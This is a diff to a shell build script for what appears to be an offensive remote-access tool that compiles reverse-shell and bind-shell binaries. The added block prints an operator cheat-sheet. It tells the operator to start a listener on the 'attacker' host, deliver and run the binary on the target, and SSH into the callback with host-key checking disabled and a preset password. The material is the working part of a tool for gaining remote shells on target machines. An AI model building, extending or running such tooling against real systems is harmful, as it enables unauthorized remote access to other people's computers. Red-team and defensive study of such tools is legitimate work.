@@ -396,6 +396,34 @@ NEXEC
 
     echo ""
     success "Build complete!"
+
+    # ── Next steps cheat-sheet ──
+    # The handler scripts are convenience wrappers — users can always drive
+    # the binary directly. Show the binary invocation as the primary command
+    # so nothing in the output implies the handler is required.
+    echo ""
+    echo -e "${TEAL}Next steps:${RESET}"
+    if [ "$MODE" = "reverse" ]; then
+        echo -e "  ${TEXT}1. Start the listener on this (attacker) host:${RESET}"
+        echo -e "       ${GREEN}$OUTPUT_DIR/$safe_name -l -p $PORT -v${RESET}"
+        echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${safe_name}.sh)${RESET}"
+        echo ""
+        echo -e "  ${TEXT}2. Deliver and run the same binary on the target:${RESET}"
+        echo -e "       ${GREEN}./$safe_name${RESET}"
+        echo ""
+        echo -e "  ${TEXT}3. Once the target calls back, in another terminal:${RESET}"
+        echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1${RESET}"
+        echo -e "       ${TEXT}Password: ${YELLOW}$PASSWORD${RESET}"
+    else
+        echo -e "  ${TEXT}1. Deploy and start the bind-shell binary on the target:${RESET}"
+        echo -e "       ${GREEN}./$safe_name${RESET}"
+        echo ""
+        echo -e "  ${TEXT}2. SSH from this (attacker) host to the target:${RESET}"
+        echo -e "       ${GREEN}ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@<target-ip>${RESET}"
+        echo -e "       ${SUBTEXT}(or: $HANDLER_DIR/connect_${safe_name}.sh <target-ip>)${RESET}"
+        echo -e "       ${TEXT}Password: ${YELLOW}$PASSWORD${RESET}"
+    fi
+    echo ""
 }
 
 # ─── Main ────────────────────────────────────────────────────────────────────
